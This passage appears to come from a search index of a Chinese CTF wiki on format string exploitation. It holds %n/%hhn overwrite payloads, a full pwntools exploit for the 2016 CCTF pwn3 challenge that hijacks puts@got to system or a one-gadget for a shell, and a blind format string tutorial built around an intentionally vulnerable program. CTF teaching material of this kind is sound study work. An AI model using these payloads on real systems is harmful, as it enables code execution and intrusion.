\uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3)","title":"\u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570"},{"location":"fmtstr/fmtstr_exploit/#_13","text":"","title":"\u8986\u76d6\u6808\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_14","text":"\u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002","title":"\u786e\u5b9a\u8986\u76d6\u5730\u5740"},{"location":"fmtstr/fmtstr_exploit/#_15","text":"\u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002","title":"\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"},{"location":"fmtstr/fmtstr_exploit/#_16","text":"\u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u8fdb\u884c\u8986\u76d6"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/","text":"2016 CCTF pwn3 \u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u6f0f\u6d1e\u51fd\u6570 \u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } \u601d\u8def \u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u7ed5\u8fc7\u5bc6\u7801 \u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i]; \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a \u6cc4\u9732 libc \u5730\u5740 content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) \u4fee\u6539 got \u8868 \u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') exp #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"2016 CCTF pwn3 writeup"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#2016-cctf-pwn3","text":"\u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806","title":"2016 CCTF pwn3"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_1","text":"","title":"\u5206\u6790"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_2","text":"32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_3","text":"\u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_4","text":"\u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u601d\u8def"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_5","text":"\u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i];","title":"\u7ed5\u8fc7\u5bc6\u7801"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_6","text":"\u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#libc","text":"content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4))","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#got","text":"\u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload(7, {puts_got: system}) creat('/bin/sh;', payload) # write 2 chunk show('/bin/sh;') # overwrite puts@got 2 system@got showlist() # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb')","title":"\u4fee\u6539 got \u8868"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"exp"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/","text":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b \u539f\u7406 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u4f7f\u7528\u6761\u4ef6 \u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e 32 \u4f4d\u5229\u7528\u624b\u6cd5 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main(int argc, char *argv[]) { setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); int flag; char buf[1024]; FILE* f; puts(\"What's your name?\"); fgets(buf, 1024, stdin); printf(\"Hi, \"); printf(\"%s\",buf); putchar('\\n'); flag = 1; while (flag == 1){ puts(\"Do you want the flag?\"); memset(buf,'\\0',1024); read(STDIN_FILENO, buf, 100); if (!strcmp(buf, \"no\\n\")){ printf(\"I see. Good bye.\"); return 0; }else { printf(\"Your input isn't right:\"); printf(buf); printf(\"Please Try again!\\n\"); } fflush(stdout); } return 0; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002 dump \u7a0b\u5e8f dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002 \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb 